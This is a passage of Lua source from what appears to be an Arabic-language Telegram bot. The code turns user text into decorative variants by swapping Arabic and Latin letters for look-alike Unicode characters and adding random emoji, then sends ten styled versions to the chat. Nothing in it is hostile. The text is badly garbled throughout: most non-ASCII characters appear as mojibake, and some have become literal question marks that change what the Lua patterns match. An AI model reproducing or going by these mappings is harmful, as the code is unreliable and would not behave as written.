Zhrf7= Zhrf7:gsub('d','ΰ»')
Zhrf7= Zhrf7:gsub('D','ΰ»')
Zhrf7= Zhrf7:gsub('f','f')
Zhrf7= Zhrf7:gsub('F','f')
Zhrf7= Zhrf7:gsub('g','ΰΊ')
Zhrf7= Zhrf7:gsub('G','ΰΊ')
Zhrf7= Zhrf7:gsub('h','h')
Zhrf7= Zhrf7:gsub('H','h')
Zhrf7= Zhrf7:gsub('j','ΰΈ§')
Zhrf7= Zhrf7:gsub('J','ΰΈ§')
Zhrf7= Zhrf7:gsub('k','k')
Zhrf7= Zhrf7:gsub('K','k')
Zhrf7= Zhrf7:gsub('L','l')
Zhrf7= Zhrf7:gsub('l','l')
Zhrf7= Zhrf7:gsub('z','ΰΊ')
Zhrf7= Zhrf7:gsub('Z','ΰΊ')
Zhrf7= Zhrf7:gsub('x','x')
Zhrf7= Zhrf7:gsub('X','x')
Zhrf7= Zhrf7:gsub('c','Β’')
Zhrf7= Zhrf7:gsub('C','Β’')
Zhrf7= Zhrf7:gsub('v','ΰΈ')
Zhrf7= Zhrf7:gsub('V','ΰΈ')
Zhrf7= Zhrf7:gsub('b','ΰΉ')
Zhrf7= Zhrf7:gsub('B','ΰΉ')
Zhrf7= Zhrf7:gsub('n','ΰΊ')
Zhrf7= Zhrf7:gsub('N','ΰΊ')
Zhrf7= Zhrf7:gsub('m','ΰΉ')
Zhrf7= Zhrf7:gsub('M','ΰΉ')



local Zhrf8= text:gsub('ΨΆ','ΨΆ');
Zhrf8= Zhrf8:gsub('Ψ΅','Ψ΅ΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ«','Ψ«ΫΩ°Ω')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('ΨΊ','ΨΊΩΩ')
Zhrf8= Zhrf8:gsub('ΨΉ','ΨΉ')
Zhrf8= Zhrf8:gsub('Ω','ΩΩ°ΫΩΩ°')
Zhrf8= Zhrf8:gsub('Ψ?','Ψ?Ψ?ΩΩ')
Zhrf8= Zhrf8:gsub('Ψ­','Ψ­ΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ¬','Ψ¬Ψ¬ΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ―','Ψ―Ω')
Zhrf8= Zhrf8:gsub('Ψ°','Ψ°Ω')
Zhrf8= Zhrf8:gsub('Ψ΄','Ψ΄Ψ΄ΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ³','Ψ³ΫΩ°')
Zhrf8= Zhrf8:gsub('Ω','ΩΩ°')
Zhrf8= Zhrf8:gsub('Ψ¨','Ψ¨Ω°Ω°')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ§','Ψ’')
Zhrf8= Zhrf8:gsub('Ψͺ','ΨͺΫΩ°')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ω','ΩΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ·','Ψ·ΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ¦',' ΩΨ¦Ω°')
Zhrf8= Zhrf8:gsub('Ψ‘','Ψ‘')
Zhrf8= Zhrf8:gsub('Ψ€','Ψ€Ψ€Ω')
Zhrf8= Zhrf8:gsub('Ψ±','Ψ±Ω')
Zhrf8= Zhrf8:gsub('ΩΨ§','ΩΫΩ°Ψ§')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ©','Ψ©')
Zhrf8= Zhrf8:gsub('Ω','ΫΩ°Ω')
Zhrf8= Zhrf8:gsub('Ψ²','Ψ²')
Zhrf8= Zhrf8:gsub('ΨΈ','ΨΈΫΩ°')
Zhrf8= Zhrf8:gsub('q','Υ¦')
Zhrf8= Zhrf8:gsub('Q','Υ¦')
Zhrf8= Zhrf8:gsub('w','Υ‘')
Zhrf8= Zhrf8:gsub('W','Υ‘')
Zhrf8= Zhrf8:gsub('e','Ι')
Zhrf8= Zhrf8:gsub('E','Ι')
Zhrf8= Zhrf8:gsub('r','Κ')
Zhrf8= Zhrf8:gsub('R','Κ')
Zhrf8= Zhrf8:gsub('t','ΘΆ')
Zhrf8= Zhrf8:gsub('T','ΘΆ')
Zhrf8= Zhrf8:gsub('y','Κ')
Zhrf8= Zhrf8:gsub('Y','Κ')
Zhrf8= Zhrf8:gsub('u','Κ')
Zhrf8= Zhrf8:gsub('U','Κ')
Zhrf8= Zhrf8:gsub('i','Ι¨')
Zhrf8= Zhrf8:gsub('I','Ι¨')
Zhrf8= Zhrf8:gsub('o','Φ')
Zhrf8= Zhrf8:gsub('O','Φ')
Zhrf8= Zhrf8:gsub('p','Φ')
Zhrf8= Zhrf8:gsub('P','Φ')
Zhrf8= Zhrf8:gsub('a','Η')
Zhrf8= Zhrf8:gsub('A','Η')
Zhrf8= Zhrf8:gsub('s','Φ')
Zhrf8= Zhrf8:gsub('S','Φ')
Zhrf8= Zhrf8:gsub('d','Ι')
Zhrf8= Zhrf8:gsub('D','Ι')
Zhrf8= Zhrf8:gsub('f','Κ')
Zhrf8= Zhrf8:gsub('F','Κ')
Zhrf8= Zhrf8:gsub('g','Ι’')
Zhrf8= Zhrf8:gsub('G','Ι’')
Zhrf8= Zhrf8:gsub('h','Ι¦')
Zhrf8= Zhrf8:gsub('H','Ι¦')
Zhrf8= Zhrf8:gsub('j','Κ')
Zhrf8= Zhrf8:gsub('J','Κ')
Zhrf8= Zhrf8:gsub('k','Σ')
Zhrf8= Zhrf8:gsub('K','Σ')
Zhrf8= Zhrf8:gsub('L','Κ')
Zhrf8= Zhrf8:gsub('l','Κ')
Zhrf8= Zhrf8:gsub('z','Κ')
Zhrf8= Zhrf8:gsub('Z','Κ')
Zhrf8= Zhrf8:gsub('x','ΣΌ')
Zhrf8= Zhrf8:gsub('X','ΣΌ')
Zhrf8= Zhrf8:gsub('c','Ζ')
Zhrf8= Zhrf8:gsub('C','Ζ')
Zhrf8= Zhrf8:gsub('v','Κ')
Zhrf8= Zhrf8:gsub('V','Κ')
Zhrf8= Zhrf8:gsub('b','Ι?')
Zhrf8= Zhrf8:gsub('B','Ι?')
Zhrf8= Zhrf8:gsub('n','ΥΌ')
Zhrf8= Zhrf8:gsub('N','ΥΌ')
Zhrf8= Zhrf8:gsub('m','Κ')
Zhrf8= Zhrf8:gsub('M','Κ')



local Zhrf9= text:gsub('ΨΆ','ΨΆ')
Zhrf9= Zhrf9:gsub('Ψ΅','Ψ΅')
Zhrf9= Zhrf9:gsub('Ψ«','Ψ«')
Zhrf9= Zhrf9:gsub('Ω','ΩΩ')
Zhrf9= Zhrf9:gsub('Ω','ΩΩ')
Zhrf9= Zhrf9:gsub('ΨΊ','ΨΊ')
Zhrf9= Zhrf9:gsub('ΨΉ','ΨΉΩ')
Zhrf9= Zhrf9:gsub('Ω','ΩΩ')
Zhrf9= Zhrf9:gsub('Ψ?','Ψ?Ω')
Zhrf9= Zhrf9:gsub('Ψ­','Ψ­Ω')
Zhrf9= Zhrf9:gsub('Ψ¬','Ψ¬Ω')
Zhrf9= Zhrf9:gsub('Ψ―','Ψ―Ω')
Zhrf9= Zhrf9:gsub('Ψ°','Ψ°Ω')
Zhrf9= Zhrf9:gsub('Ψ΄','Ψ΄Ω')
Zhrf9= Zhrf9:gsub('Ψ³','Ψ³')
Zhrf9= Zhrf9:gsub('Ω','Ω')
Zhrf9= Zhrf9:gsub('Ψ¨','Ψ¨Ω')
Zhrf9= Zhrf9:gsub('Ω','ΩΩΩ')
Zhrf9= Zhrf9:gsub('Ψ§','Ψ’')
Zhrf9= Zhrf9:gsub('Ψͺ','Ψͺ')
Zhrf9= Zhrf9:gsub('Ω','Ω')
Zhrf9= Zhrf9:gsub('Ω','Ω')
Zhrf9= Zhrf9:gsub('Ω','Ϊͺ')
Zhrf9= Zhrf9:gsub('Ψ·','Ψ·Ω')
Zhrf9= Zhrf9:gsub('Ψ¦','Ψ¦ ΩΩ°')
Zhrf9= Zhrf9:gsub('Ψ‘','Ψ‘')
Zhrf9= Zhrf9:gsub('Ψ€','Ψ€')
Zhrf9= Zhrf9:gsub('Ψ±','Ψ±')
Zhrf9= Zhrf9:gsub('ΩΨ§','ΩΩΩΨ’')
Zhrf9= Zhrf9:gsub('Ω','ΩΩ')
Zhrf9= Zhrf9:gsub('Ψ©','Ψ©')
Zhrf9= Zhrf9:gsub('Ω','ΩΩ')
Zhrf9= Zhrf9:gsub('Ψ²','Ψ²')
Zhrf9= Zhrf9:gsub('ΨΈ','ΨΈΩΩ')
Zhrf9= Zhrf9:gsub('q','Q')
Zhrf9= Zhrf9:gsub('Q','Q')
Zhrf9= Zhrf9:gsub('w','αΊ')
Zhrf9= Zhrf9:gsub('W','αΊ')
Zhrf9= Zhrf9:gsub('e','αΌ')
Zhrf9= Zhrf9:gsub('E','αΌ')
Zhrf9= Zhrf9:gsub('r','Θ')
Zhrf9= Zhrf9:gsub('R','Θ')
Zhrf9= Zhrf9:gsub('t','?¬')
Zhrf9= Zhrf9:gsub('T','?¬')
Zhrf9= Zhrf9:gsub('y','α½')
Zhrf9= Zhrf9:gsub('Y','α½')
Zhrf9= Zhrf9:gsub('u','Θ')
Zhrf9= Zhrf9:gsub('U','Θ')
Zhrf9= Zhrf9:gsub('i','αΌΏ')
Zhrf9= Zhrf9:gsub('I','αΌΏ')
Zhrf9= Zhrf9:gsub('o','α½')
Zhrf9= Zhrf9:gsub('O','α½')
Zhrf9= Zhrf9:gsub('p','Ζ€')
Zhrf9= Zhrf9:gsub('P','Ζ€')
Zhrf9= Zhrf9:gsub('a','αΎ')
Zhrf9= Zhrf9:gsub('A','αΎ')
Zhrf9= Zhrf9:gsub('s','αΉ¨')
Zhrf9= Zhrf9:gsub('S','αΉ¨')
Zhrf9= Zhrf9:gsub('d','Ζ')
Zhrf9= Zhrf9:gsub('D','Ζ')
Zhrf9= Zhrf9:gsub('f','?')
Zhrf9= Zhrf9:gsub('F','?')
Zhrf9= Zhrf9:gsub('g','Ζ')
Zhrf9= Zhrf9:gsub('G','Ζ')
Zhrf9= Zhrf9:gsub('h','αΌ¬')
Zhrf9= Zhrf9:gsub('H','αΌ¬')
Zhrf9= Zhrf9:gsub('j','Π')
Zhrf9= Zhrf9:gsub('J','Π')
Zhrf9= Zhrf9:gsub('k','αΈ°')
Zhrf9= Zhrf9:gsub('K','αΈ°')
Zhrf9= Zhrf9:gsub('L','ΔΏ')
Zhrf9= Zhrf9:gsub('l','ΔΏ')
Zhrf9= Zhrf9:gsub('z','αΊ')
Zhrf9= Zhrf9:gsub('Z','αΊ')
Zhrf9= Zhrf9:gsub('x','αΊ')
Zhrf9= Zhrf9:gsub('X','αΊ')
Zhrf9= Zhrf9:gsub('c','Ζ')
Zhrf9= Zhrf9:gsub('C','Ζ')
Zhrf9= Zhrf9:gsub('v','V')
Zhrf9= Zhrf9:gsub('V','V')
Zhrf9= Zhrf9:gsub('b','Ο')
Zhrf9= Zhrf9:gsub('B','Ο')
Zhrf9= Zhrf9:gsub('n','Ζ')
Zhrf9= Zhrf9:gsub('N','Ζ')
Zhrf9= Zhrf9:gsub('m','αΉ')
Zhrf9= Zhrf9:gsub('M','αΉ')


local Text_Zhrfa = "1- `"..Zhrf..EmojeS[math.random(#EmojeS)]
.."`\n\n2- `"..Zhrf2..EmojeS[math.random(#EmojeS)]
.."`\n\n3- `"..Zhrf3..EmojeS[math.random(#EmojeS)]
.."`\n\n4- `"..Zhrf4..EmojeS[math.random(#EmojeS)]
.."`\n\n5- `"..Zhrf5..EmojeS[math.random(#EmojeS)]
.."`\n\n6- `"..Zhrf6..EmojeS[math.random(#EmojeS)]
.."`\n\n7- `"..Zhrf7..EmojeS[math.random(#EmojeS)]
.."`\n\n8- `"..Zhrf8..Emoje[math.random(#Emoje)]
.."`\n\n9- `"..Zhrf9..Emoje[math.random(#Emoje)]
.."`\n\n10- `"..Zhrf5..Emoje[math.random(#Emoje)]
Text_Zhrfa = Text_Zhrfa.."`\n\nπ| Ψ§ΨΆΨΊΨ· ΨΉ Ψ§ΩΨ§Ψ³Ω ΩΩΨͺΩ Ψ§ΩΩΨ³Ψ? \nβ"
send(msg.chat_id_,msg.id_,''..Text_Zhrfa..'\n----------SOURCE REVOR-----------\n')
return false
end

if text and text ~="Ψ²Ψ?Ψ±ΩΩ" and database:get(bot_id..":"..msg.sender_user_id_.."Zf"..msg.chat_id_) == "sendZf" then
Text = msg.text
database:del(bot_id..":"..msg.sender_user_id_.."Zf"..msg.chat_id_)
local EmojeS = {
  ' π»',
  ' π΄  ',
  ' πΆ ',
  ' π‘',
  ' π’', 
  ' π£', 
  ' β½β',
  ' π ±Β²Β²', 
  'β½', 
  ' π‘β', 
  ' π‘β‘', 
  ' π‘¨', 
  }
  
  local Emoje = {
  ' β',
  ' π€',
  'Λπ€',
  ' ΰ½» β«',
  ' β« ',
  ' π Ά ',
  ' π ²',
  ' π‘₯',
  '  β¬',
  ' π€',
  ' πΌ',
  ' β  '
}

local Zhrf = text:gsub('ΨΆ','ΨΆΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ΅','Ψ΅Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ«','Ψ«Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΝΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('ΨΊ','ΨΊΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('ΨΉ','ΨΉΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ?','Ψ?ΜΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ­','Ψ­Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ¬','Ψ¬Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ΄','Ψ΄Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ³','Ψ³Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ¨','Ψ¨Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ§','Ψ’')
Zhrf = Zhrf:gsub('Ψͺ','ΨͺΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΪͺΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ·','Ψ·Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('ΨΈ','ΨΈΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ‘','Ψ‘')
Zhrf = Zhrf:gsub('Ψ€','Ψ€')
Zhrf = Zhrf:gsub('Ψ±','Ψ±')
Zhrf = Zhrf:gsub('Ω','Ω')
Zhrf = Zhrf:gsub('Ψ²','Ψ²')
Zhrf = Zhrf:gsub('Ω','ο―Μ²ΰ­­')
Zhrf = Zhrf:gsub('Ω','ΫΏΫΏΫ')
Zhrf = Zhrf:gsub('a','α―')
Zhrf = Zhrf:gsub('A','α―')
Zhrf = Zhrf:gsub("b","α°")
Zhrf = Zhrf:gsub("B","α°")
Zhrf = Zhrf:gsub("c","α¨")
Zhrf = Zhrf:gsub("C","α¨")
Zhrf = Zhrf:gsub("d","α§")
Zhrf = Zhrf:gsub("D","α§")
Zhrf = Zhrf:gsub("e","α")
Zhrf = Zhrf:gsub("E","α")
Zhrf = Zhrf:gsub("f","α¦")
Zhrf = Zhrf:gsub("F","α¦")
Zhrf = Zhrf:gsub("g","α³")
Zhrf = Zhrf:gsub("G","α³")
Zhrf = Zhrf:gsub("h","α²")
Zhrf = Zhrf:gsub("H","α²")
Zhrf = Zhrf:gsub("i","α¨")
Zhrf = Zhrf:gsub("I","α¨")
Zhrf = Zhrf:gsub("j","α ")
Zhrf = Zhrf:gsub("J","α ")
Zhrf = Zhrf:gsub("k","α₯")
Zhrf = Zhrf:gsub("K","α₯")
Zhrf = Zhrf:gsub("l","α")
Zhrf = Zhrf:gsub("L","α")
Zhrf = Zhrf:gsub("m","α°")
Zhrf = Zhrf:gsub("M","α°")
Zhrf = Zhrf:gsub("n","α")
Zhrf = Zhrf:gsub("N","α")
Zhrf = Zhrf:gsub("o","α§")
Zhrf = Zhrf:gsub("O","α§")
Zhrf = Zhrf:gsub("p","α?")
Zhrf = Zhrf:gsub("P","α?")
Zhrf = Zhrf:gsub("q","α")
Zhrf = Zhrf:gsub("Q","α")
Zhrf = Zhrf:gsub("r","α")
Zhrf = Zhrf:gsub("R","α")
Zhrf = Zhrf:gsub("s","α")
Zhrf = Zhrf:gsub("S","α")
Zhrf = Zhrf:gsub("t","α‘")
Zhrf = Zhrf:gsub("T","α‘")
Zhrf = Zhrf:gsub("u","α¬")
Zhrf = Zhrf:gsub("U","α¬")
Zhrf = Zhrf:gsub("v","α")
Zhrf = Zhrf:gsub("V","α")
Zhrf = Zhrf:gsub("w","α")
Zhrf = Zhrf:gsub("W","α")
Zhrf = Zhrf:gsub("x","α²")
Zhrf = Zhrf:gsub("X","α²")
Zhrf = Zhrf:gsub("y","α½")
Zhrf = Zhrf:gsub("Y","α½")
Zhrf = Zhrf:gsub("z","α")
Zhrf = Zhrf:gsub("Z","α")



local Zhrf2 = text:gsub('ΨΆ','ΨΆΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ΅','Ψ΅Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ«','Ψ«Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΝΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('ΨΊ','ΨΊΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('ΨΉ','ΨΉΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ?','Ψ?ΜΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ­','Ψ­Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ¬','Ψ¬Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ΄','Ψ΄Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ³','Ψ³Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ¨','Ψ¨Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ§','Ψ’')
Zhrf2 = Zhrf2:gsub('Ψͺ','ΨͺΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΪͺΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ·','Ψ·Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('ΨΈ','ΨΈΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ‘','Ψ‘')
Zhrf2 = Zhrf2:gsub('Ψ€','Ψ€')
Zhrf2 = Zhrf2:gsub('Ψ±','Ψ±')
Zhrf2 = Zhrf2:gsub('Ω','Ω')
Zhrf2 = Zhrf2:gsub('Ψ²','Ψ²')
Zhrf2 = Zhrf2:gsub('Ω','ο―Μ²ΰ­­')
Zhrf2 = Zhrf2:gsub("Ω", "ΫΏΫΏΫ")
Zhrf2 = Zhrf2:gsub('a',"α΅")
Zhrf2 = Zhrf2:gsub('A',"α΅")
Zhrf2 = Zhrf2:gsub("b","α΅")
Zhrf2 = Zhrf2:gsub("B","α΅")
Zhrf2 = Zhrf2:gsub("c","αΆ")
Zhrf2 = Zhrf2:gsub("C","αΆ")
Zhrf2 = Zhrf2:gsub("d","α΅")
Zhrf2 = Zhrf2:gsub("D","α΅")
Zhrf2 = Zhrf2:gsub("e","α΅")
Zhrf2 = Zhrf2:gsub("E","α΅")
Zhrf2 = Zhrf2:gsub("f","αΆ ")
Zhrf2 = Zhrf2:gsub("F","αΆ ")
Zhrf2 = Zhrf2:gsub("g","α΅")
Zhrf2 = Zhrf2:gsub("G","α΅")
Zhrf2 = Zhrf2:gsub("h","Κ°")
Zhrf2 = Zhrf2:gsub("H","Κ°")
Zhrf2 = Zhrf2:gsub("i","αΆ€")
Zhrf2 = Zhrf2:gsub("I","αΆ€")
Zhrf2 = Zhrf2:gsub("j","Κ²")
Zhrf2 = Zhrf2:gsub("J","Κ²")
Zhrf2 = Zhrf2:gsub("k","α΅")
Zhrf2 = Zhrf2:gsub("K","α΅")
Zhrf2 = Zhrf2:gsub("l","Λ‘")
Zhrf2 = Zhrf2:gsub("L","Λ‘")
Zhrf2 = Zhrf2:gsub("m","α΅")
Zhrf2 = Zhrf2:gsub("M","α΅")
Zhrf2 = Zhrf2:gsub("n","αΆ°")
Zhrf2 = Zhrf2:gsub("N","αΆ°")
Zhrf2 = Zhrf2:gsub("o","α΅")
Zhrf2 = Zhrf2:gsub("O","α΅")
Zhrf2 = Zhrf2:gsub("p","α΅")
Zhrf2 = Zhrf2:gsub("P","α΅")
Zhrf2 = Zhrf2:gsub("q","α΅ ")
Zhrf2 = Zhrf2:gsub("Q","α΅ ")
Zhrf2 = Zhrf2:gsub("r","Κ³")
Zhrf2 = Zhrf2:gsub("R","Κ³")
Zhrf2 = Zhrf2:gsub("s","Λ’")
Zhrf2 = Zhrf2:gsub("S","Λ’")
Zhrf2 = Zhrf2:gsub("t","α΅")
Zhrf2 = Zhrf2:gsub("T","α΅")
Zhrf2 = Zhrf2:gsub("u","α΅")
Zhrf2 = Zhrf2:gsub("U","α΅")
Zhrf2 = Zhrf2:gsub("v","α΅")
Zhrf2 = Zhrf2:gsub("V","α΅")
Zhrf2 = Zhrf2:gsub("w","Κ·")
Zhrf2 = Zhrf2:gsub("W","Κ·")
Zhrf2 = Zhrf2:gsub("x","Λ£")
Zhrf2 = Zhrf2:gsub("X","Λ£")
Zhrf2 = Zhrf2:gsub("y","ΚΈ")
Zhrf2 = Zhrf2:gsub("Y","ΚΈ")
Zhrf2 = Zhrf2:gsub("z","αΆ»")
Zhrf2 = Zhrf2:gsub("Z","αΆ»")


local Zhrf3= text:gsub('ΨΆ','ΨΆ')
Zhrf3= Zhrf3:gsub('Ψ΅','Ψ΅')
Zhrf3= Zhrf3:gsub('Ψ«','Ψ«Ϋ')
Zhrf3= Zhrf3:gsub('Ω','Ω')
Zhrf3= Zhrf3:gsub('Ω','ΩΩΫ')
Zhrf3= Zhrf3:gsub('ΨΊ','ΨΊΫ')
Zhrf3= Zhrf3:gsub('ΨΉ','ΨΉΫ')
Zhrf3= Zhrf3:gsub('Ω','ΩΩ°ΫΩΩ°')
Zhrf3= Zhrf3:gsub('Ψ?','Ψ?Ϋ')
Zhrf3= Zhrf3:gsub('Ψ­','Ψ­Ϋ')
Zhrf3= Zhrf3:gsub('Ψ¬','Ψ¬Ϋ')
Zhrf3= Zhrf3:gsub('Ψ―','Ψ―')
Zhrf3= Zhrf3:gsub('Ψ°','Ψ°')
Zhrf3= Zhrf3:gsub('Ψ΄','Ψ΄Ϋ')
Zhrf3= Zhrf3:gsub('Ψ³','Ψ³Ϋ')
Zhrf3= Zhrf3:gsub('Ω','ΩΫ')
Zhrf3= Zhrf3:gsub('Ψ¨','Ψ¨Ω')
Zhrf3= Zhrf3:gsub('Ω','ΩΫ')
Zhrf3= Zhrf3:gsub('Ψ§','Ψ§')
Zhrf3= Zhrf3:gsub('Ψͺ','ΨͺΫ')
Zhrf3= Zhrf3:gsub('Ω','ΩΩ°ΫΩΩ°')
Zhrf3= Zhrf3:gsub('Ω','ΩΩ°ΫΩΩ°')
Zhrf3= Zhrf3:gsub('Ω','ΩΩΫ')
Zhrf3= Zhrf3:gsub('Ψ·','Ψ·Ϋ')
Zhrf3= Zhrf3:gsub('Ψ¦','Ψ¦ ΩΩ°')
Zhrf3= Zhrf3:gsub('Ψ‘','Ψ‘')
Zhrf3= Zhrf3:gsub('Ψ€','Ψ€')
Zhrf3= Zhrf3:gsub('Ψ±','Ψ±Ω')
Zhrf3= Zhrf3:gsub('ΩΨ§','ΩΫΨ§')
Zhrf3= Zhrf3:gsub('Ω','ΩΩ')
Zhrf3= Zhrf3:gsub('Ψ©','Ψ©')
Zhrf3= Zhrf3:gsub('Ω','Ω')
Zhrf3= Zhrf3:gsub('Ψ²','Ψ²')
Zhrf3= Zhrf3:gsub('ΨΈ','ΨΈΫΫΩ°Ω°')
Zhrf3= Zhrf3:gsub('q','κ')
Zhrf3= Zhrf3:gsub('Q','κ')
Zhrf3= Zhrf3:gsub('w','αΎ§')
Zhrf3= Zhrf3:gsub('W','αΎ§')
Zhrf3= Zhrf3:gsub('e','αΌ')
Zhrf3= Zhrf3:gsub('E','αΌ')
Zhrf3= Zhrf3:gsub('r','Κ')
Zhrf3= Zhrf3:gsub('R','Κ')
Zhrf3= Zhrf3:gsub('t','?­')
Zhrf3= Zhrf3:gsub('T','?­')
Zhrf3= Zhrf3:gsub('y','αΊ')
Zhrf3= Zhrf3:gsub('Y','αΊ')
Zhrf3= Zhrf3:gsub('u','α½')
Zhrf3= Zhrf3:gsub('i','αΌ·')
Zhrf3= Zhrf3:gsub('o','α½')
Zhrf3= Zhrf3:gsub('p','αΏ₯')
Zhrf3= Zhrf3:gsub('a','αΎ')
Zhrf3= Zhrf3:gsub('s','αΉ©')
Zhrf3= Zhrf3:gsub('d','αΈ')
Zhrf3= Zhrf3:gsub('f','?')
Zhrf3= Zhrf3:gsub('g','Κ')
Zhrf3= Zhrf3:gsub('h','Ρ')
Zhrf3= Zhrf3:gsub('j','Κ')
Zhrf3= Zhrf3:gsub('k','Ρ')
Zhrf3= Zhrf3:gsub('U','α½')
Zhrf3= Zhrf3:gsub('I','αΌ·')
Zhrf3= Zhrf3:gsub('O','α½')
Zhrf3= Zhrf3:gsub('P','αΏ₯')
Zhrf3= Zhrf3:gsub('A','αΎ')
Zhrf3= Zhrf3:gsub('S','αΉ©')
Zhrf3= Zhrf3:gsub('D','αΈ')
Zhrf3= Zhrf3:gsub('F','?')
Zhrf3= Zhrf3:gsub('G','Κ')
Zhrf3= Zhrf3:gsub('H','Ρ')
Zhrf3= Zhrf3:gsub('J','Κ')
Zhrf3= Zhrf3:gsub('K','Ρ')
Zhrf3= Zhrf3:gsub('L','Ε')
Zhrf3= Zhrf3:gsub('l','Ε')
Zhrf3= Zhrf3:gsub('z','αΊ')
Zhrf3= Zhrf3:gsub('Z','αΊ')
Zhrf3= Zhrf3:gsub('x','αΊ')
Zhrf3= Zhrf3:gsub('X','αΊ')
Zhrf3= Zhrf3:gsub('c','Ζ')
Zhrf3= Zhrf3:gsub('C','Ζ')
Zhrf3= Zhrf3:gsub('v','v')
Zhrf3= Zhrf3:gsub('V','v')
Zhrf3= Zhrf3:gsub('b','Π²')
Zhrf3= Zhrf3:gsub('B','Π²')
Zhrf3= Zhrf3:gsub('n','αΎ')
Zhrf3= Zhrf3:gsub('N','αΎ')
Zhrf3= Zhrf3:gsub('m','ΠΌ')
Zhrf3= Zhrf3:gsub('M','ΠΌ')


local Zhrf4= text:gsub('ΨΆ','ΨΆΫΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ΅','ΨΆΫΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ«','Ψ«ΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ω','ΩΜ²ΰΎΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ω','ΩΝΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('ΨΊ','ΨΊΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('ΨΉ','ΨΉΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ω','ΩΩ°ΫΩΩ°')
Zhrf4= Zhrf4:gsub('Ψ?','Ψ?ΜΩ°Ϋ ')
Zhrf4= Zhrf4:gsub('Ψ­','Ψ­ΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ¬','Ψ¬ΩΜ²Ω°ΩΫΫ§Ω')
Zhrf4= Zhrf4:gsub('Ψ―','Ψ―Ω°')
Zhrf4= Zhrf4:gsub('Ψ°','Ψ°Ω°Ω')
Zhrf4= Zhrf4:gsub('Ψ΄','Ψ΄ΩΩ°ΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ³','Ψ³ΩΩ°')
Zhrf4= Zhrf4:gsub('Ω','ΩΩΩ°Ϋ')
Zhrf4= Zhrf4:gsub('Ψ¨','Ψ¨ΩΫ')
Zhrf4= Zhrf4:gsub('Ω','ΩΩΜ²Ω°ΩΫ')
Zhrf4= Zhrf4:gsub('Ψ§','Ψ’')
